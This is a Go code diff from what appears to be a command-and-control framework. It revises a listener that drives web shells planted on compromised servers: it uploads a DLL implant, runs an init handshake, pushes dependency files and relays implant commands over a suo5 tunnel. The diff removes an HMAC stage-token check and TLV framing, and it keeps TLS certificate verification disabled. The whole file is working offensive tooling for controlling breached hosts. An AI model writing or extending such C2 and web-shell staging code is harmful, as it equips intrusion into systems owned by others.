@@ -2,11 +2,8 @@ package listener
 
 import (
 	"bytes"
-	"crypto/hmac"
-	"crypto/sha256"
 	"crypto/tls"
 	"encoding/binary"
-	"encoding/hex"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -26,24 +23,17 @@ import (
 	"github.com/chainreactors/logs"
 	"github.com/chainreactors/malice-network/helper/encoders/hash"
 	"github.com/chainreactors/malice-network/server/internal/core"
+	"github.com/chainreactors/malice-network/server/internal/parser"
 	"github.com/chainreactors/proxyclient/suo5"
 	"google.golang.org/protobuf/proto"
 )
 
-// Stage codes for DLL bootstrap HTTP envelope.
+// Bootstrap stage names for HTTP query string (?s=<stage>).
 const (
-	wsStageLoad   byte = 0x01
-	wsStageStatus byte = 0x02
-	wsStageInit   byte = 0x03
-	wsStageDeps   byte = 0x06
-)
-
-// TLV delimiters matching malefic wire format.
-const (
-	tlvStart     byte   = 0xd1
-	tlvEnd       byte   = 0xd2
-	tlvHeaderLen        = 9 // 1 (start) + 4 (sid) + 4 (len)
-	maxFrameSize uint32 = 10 * 1024 * 1024
+	wsStageLoad   = "load"
+	wsStageStatus = "status"
+	wsStageInit   = "init"
+	wsStageDeps   = "deps"
 )
 
 // webshellParams is the JSON stored in CustomPipeline.Params.
@@ -52,69 +42,6 @@ type webshellParams struct {
 	StageToken string `json:"stage_token,omitempty"`
 	DLLPath    string `json:"dll_path,omitempty"`
 	DepsDir    string `json:"deps_dir,omitempty"`
-}
-
-// httpTransport wraps a shared http.Client with OPSEC-safe defaults.
-type httpTransport struct {
-	client *http.Client
-	url    string
-	token  string
-}
-
-func newHTTPTransport(suo5URL, token string, timeout time.Duration) *httpTransport {
-	return &httpTransport{
-		client: &http.Client{
-			Timeout: timeout,
-			Transport: &http.Transport{
-				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-			},
-		},
-		url:   suo5ToHTTPURL(suo5URL),
-		token: token,
-	}
-}
-
-// do sends a body-envelope HTTP POST.
-// Envelope: [1B stage][4B sid LE][1B token_len][token][payload]
-// No XOR obfuscation — webshells (PHP/JSP/ASPX) parse the raw envelope directly.
-func (t *httpTransport) do(stage byte, payload []byte, sid uint32) ([]byte, error) {
-	tok := computeBootstrapToken(t.token)
-	tokLen := len(tok)
-	if tokLen > 255 {
-		tokLen = 255
-		tok = tok[:255]
-	}
-
-	hdrLen := 6 + tokLen
-	buf := make([]byte, hdrLen+len(payload))
-	buf[0] = stage
-	binary.LittleEndian.PutUint32(buf[1:5], sid)
-	buf[5] = byte(tokLen)
-	copy(buf[6:6+tokLen], tok)
-	copy(buf[hdrLen:], payload)
-
-	req, err := http.NewRequest("POST", t.url, bytes.NewReader(buf))
-	if err != nil {
-		return nil, err
-	}
-	// OPSEC: no fingerprinting headers.
-	req.Header.Set("User-Agent", "")
-	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
-
-	resp, err := t.client.Do(req)
-	if err != nil {
-		return nil, err
-	}
-	defer resp.Body.Close()
-
-	body, err := io.ReadAll(resp.Body)
-	if err != nil {
-		return nil, err
-	}
-	if resp.StatusCode != http.StatusOK {
-		return nil, fmt.Errorf("HTTP %d: %s", resp.StatusCode, string(body))
-	}
-	return body, nil
 }
 
 func NewWebShellPipeline(rpc bindRPCClient, pipeline *clientpb.Pipeline) (*WebShellPipeline, error) {
@@ -136,17 +63,27 @@ func NewWebShellPipeline(rpc bindRPCClient, pipeline *clientpb.Pipeline) (*WebSh
 		return nil, fmt.Errorf("webshell pipeline requires suo5_url")
 	}
 
+	msgParser, err := parser.NewParser(consts.ImplantMalefic)
+	if err != nil {
+		return nil, fmt.Errorf("create malefic parser: %w", err)
+	}
+
 	return &WebShellPipeline{
 		rpc:        rpc,
 		Name:       pipeline.Name,
 		ListenerID: pipeline.ListenerId,
 		Enable:     pipeline.Enable,
 		Suo5URL:    params.Suo5URL,
-		StageToken: params.StageToken,
 		DLLPath:    params.DLLPath,
 		DepsDir:    params.DepsDir,
-		transport:  newHTTPTransport(params.Suo5URL, params.StageToken, 30*time.Second),
-		pipeline:   pipeline,
+		parser:     msgParser,
+		httpClient: &http.Client{
+			Timeout: 30 * time.Second,
+			Transport: &http.Transport{
+				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+			},
+		},
+		pipeline: pipeline,
 	}, nil
 }
 
@@ -156,13 +93,13 @@ type WebShellPipeline struct {
 	ListenerID string
 	Enable     bool
 	Suo5URL    string
-	StageToken string
 	DLLPath    string
 	DepsDir    string
 
-	transport *httpTransport
-	sessions  sync.Map // rawID(uint32) → *webshellSession
-	pipeline  *clientpb.Pipeline
+	parser     *parser.MessageParser
+	httpClient *http.Client
+	sessions   sync.Map // rawID(uint32) → *webshellSession
+	pipeline   *clientpb.Pipeline
 }
 
 type webshellSession struct {
@@ -235,7 +172,7 @@ func (p *WebShellPipeline) handlerReq(req *clientpb.SpiteRequest) error {
 
 	spites := &implantpb.Spites{Spites: []*implantpb.Spite{req.Spite}}
 	sess.mu.Lock()
-	err := writeFrame(sess.conn, spites, sess.rawID)
+	err := p.parser.WritePacket(sess.conn, spites, sess.rawID)
 	sess.mu.Unlock()
 	return err
 }
@@ -290,7 +227,7 @@ func (p *WebShellPipeline) readLoop(sess *webshellSession, sessionID string) err
 		logs.Log.Debugf("[webshell] readLoop exit for session %d", sess.rawID)
 	}()
 	for {
-		spites, err := readFrame(sess.conn)
+		_, spites, err := p.parser.ReadPacket(sess.conn)
 		if err != nil {
 			return fmt.Errorf("session %d read: %w", sess.rawID, err)
 		}
@@ -304,7 +241,7 @@ func (p *WebShellPipeline) readLoop(sess *webshellSession, sessionID string) err
 
 // bootstrapDLL performs status check, DLL load if needed, and init handshake.
 func (p *WebShellPipeline) bootstrapDLL() (*implantpb.Register, uint32, error) {
-	statusBody, err := p.transport.do(wsStageStatus, nil, 0)
+	statusBody, err := p.bootstrapHTTP(wsStageStatus, nil)
 	if err != nil {
 		return nil, 0, fmt.Errorf("status check: %w", err)
 	}
@@ -325,15 +262,15 @@ func (p *WebShellPipeline) bootstrapDLL() (*implantpb.Register, uint32, error) {
 		if err != nil {
 			return nil, 0, fmt.Errorf("read DLL %s: %w", p.DLLPath, err)
 		}
-		if _, err = p.transport.do(wsStageLoad, dllBytes, 0); err != nil {
+		if _, err = p.bootstrapHTTP(wsStageLoad, dllBytes); err != nil {
 			return nil, 0, fmt.Errorf("load DLL: %w", err)
 		}
-		logs.Log.Infof("[webshell] DLL loaded to %s", p.transport.url)
+		logs.Log.Infof("[webshell] DLL loaded to %s", suo5ToHTTPURL(p.Suo5URL))
 	} else if !ready {
 		return nil, 0, fmt.Errorf("DLL not loaded and no --dll path provided")
 	}
 
-	body, err := p.transport.do(wsStageInit, nil, 0)
+	body, err := p.bootstrapHTTP(wsStageInit, nil)
 	if err != nil {
 		return nil, 0, fmt.Errorf("init: %w", err)
 	}
@@ -364,24 +301,54 @@ func (p *WebShellPipeline) deliverDeps() error {
 			return fmt.Errorf("read dep %s: %w", entry.Name(), err)
 		}
 		depName := entry.Name()
-		if !strings.HasPrefix(depName, ".") {
-			depName = "." + depName
+		reqURL := fmt.Sprintf("%s?s=%s&name=%s", suo5ToHTTPURL(p.Suo5URL), wsStageDeps, url.QueryEscape(depName))
+		req, err := http.NewRequest("POST", reqURL, bytes.NewReader(data))
+		if err != nil {
+			return fmt.Errorf("create dep request %s: %w", depName, err)
 		}
-		nameBytes := []byte(depName)
-		if len(nameBytes) > 255 {
-			nameBytes = nameBytes[:255]
+		req.Header.Set("Content-Type", "application/octet-stream")
+		resp, err := p.httpClient.Do(req)
+		if err != nil {
+			return fmt.Errorf("deliver dep %s: %w", depName, err)
 		}
-		payload := make([]byte, 1+len(nameBytes)+len(data))
-		payload[0] = byte(len(nameBytes))
-		copy(payload[1:1+len(nameBytes)], nameBytes)
-		copy(payload[1+len(nameBytes):], data)
-
-		if _, err = p.transport.do(wsStageDeps, payload, 0); err != nil {
-			return fmt.Errorf("deliver dep %s: %w", entry.Name(), err)
+		resp.Body.Close()
+		if resp.StatusCode != http.StatusOK {
+			return fmt.Errorf("deliver dep %s: HTTP %d", depName, resp.StatusCode)
 		}
-		logs.Log.Debugf("[webshell] dep delivered: %s", entry.Name())
+		logs.Log.Debugf("[webshell] dep delivered: %s", depName)
 	}
 	return nil
+}
+
+// bootstrapHTTP sends a simple HTTP POST with stage in query string.
+// ?s=status / ?s=load / ?s=init
+func (p *WebShellPipeline) bootstrapHTTP(stage string, payload []byte) ([]byte, error) {
+	reqURL := fmt.Sprintf("%s?s=%s", suo5ToHTTPURL(p.Suo5URL), stage)
+
+	var bodyReader io.Reader
+	if payload != nil {
+		bodyReader = bytes.NewReader(payload)
+	}
+	req, err := http.NewRequest("POST", reqURL, bodyReader)
+	if err != nil {
+		return nil, err
+	}
+	req.Header.Set("Content-Type", "application/octet-stream")
+
+	resp, err := p.httpClient.Do(req)
+	if err != nil {
+		return nil, err
+	}
+	defer resp.Body.Close()
+
+	body, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return nil, err
+	}
+	if resp.StatusCode != http.StatusOK {
+		return nil, fmt.Errorf("HTTP %d: %s", resp.StatusCode, string(body))
+	}
+	return body, nil
 }
 
 func (p *WebShellPipeline) dialSuo5() (net.Conn, error) {
@@ -393,9 +360,6 @@ func (p *WebShellPipeline) dialSuo5() (net.Conn, error) {
 	if err != nil {
 		return nil, fmt.Errorf("suo5 config: %w", err)
 	}
-	if string(conf.Mode) == "half" {
-		return nil, fmt.Errorf("suo5 detected half-duplex mode; webshell bridge requires full-duplex (target may be behind a buffering reverse proxy)")
-	}
 	client := &suo5.Suo5Client{Proxy: u, Conf: conf}
 	conn, err := client.Dial("tcp", "bridge:0")
 	if err != nil {
@@ -405,83 +369,10 @@ func (p *WebShellPipeline) dialSuo5() (net.Conn, error) {
 }
 
 func (p *WebShellPipeline) runtimeErrorHandler(scope string) core.GoErrorHandler {
-	label := fmt.Sprintf("webshell pipeline %s %s", p.Name, scope)
-	return core.CombineErrorHandlers(
-		core.LogGuardedError(label),
-		func(err error) {
-			p.Enable = false
-			if core.EventBroker != nil {
-				core.EventBroker.Publish(core.Event{
-					EventType: consts.EventListener,
-					Op:        consts.CtrlPipelineStop,
-					Listener:  &clientpb.Listener{Id: p.ListenerID},
-					Message:   label,
-					Err:       core.ErrorText(err),
-					Important: true,
-				})
-			}
-		},
-	)
-}
-
-// --- TLV frame protocol: [0xd1][4B sid LE][4B len LE][data][0xd2] ---
-
-func writeFrame(conn net.Conn, spites *implantpb.Spites, sid uint32) error {
-	data, err := proto.Marshal(spites)
-	if err != nil {
-		return err
-	}
-	buf := make([]byte, tlvHeaderLen+len(data)+1)
-	buf[0] = tlvStart
-	binary.LittleEndian.PutUint32(buf[1:5], sid)
-	binary.LittleEndian.PutUint32(buf[5:9], uint32(len(data)))
-	copy(buf[tlvHeaderLen:], data)
-	buf[len(buf)-1] = tlvEnd
-	_, err = conn.Write(buf)
-	return err
-}
-
-func readFrame(conn net.Conn) (*implantpb.Spites, error) {
-	var hdr [tlvHeaderLen]byte
-	if _, err := io.ReadFull(conn, hdr[:]); err != nil {
-		return nil, err
-	}
-	if hdr[0] != tlvStart {
-		return nil, fmt.Errorf("invalid TLV start: 0x%02x", hdr[0])
-	}
-	length := binary.LittleEndian.Uint32(hdr[5:9])
-	if length > maxFrameSize {
-		return nil, fmt.Errorf("frame too large: %d bytes", length)
-	}
-	// +1 for end delimiter
-	payload := make([]byte, length+1)
-	if _, err := io.ReadFull(conn, payload); err != nil {
-		return nil, err
-	}
-	if payload[length] != tlvEnd {
-		return nil, fmt.Errorf("invalid TLV end: 0x%02x", payload[length])
-	}
-	spites := &implantpb.Spites{}
-	if err := proto.Unmarshal(payload[:length], spites); err != nil {
-		return nil, err
-	}
-	return spites, nil
+	return core.PipelineRuntimeErrorHandler("webshell", p.Name+" "+scope, p.ListenerID, func() { p.Enable = false }, nil)
 }
 
 // --- Helpers ---
-
-func computeBootstrapToken(secret string) string {
-	if secret == "" {
-		return ""
-	}
-	if len(secret) <= 32 {
-		return secret
-	}
-	window := time.Now().Unix() / 30
-	mac := hmac.New(sha256.New, []byte(secret))
-	_ = binary.Write(mac, binary.BigEndian, window)
-	return hex.EncodeToString(mac.Sum(nil))
-}
 
 func suo5ToHTTPURL(suo5URL string) string {
 	s := strings.TrimSpace(suo5URL)
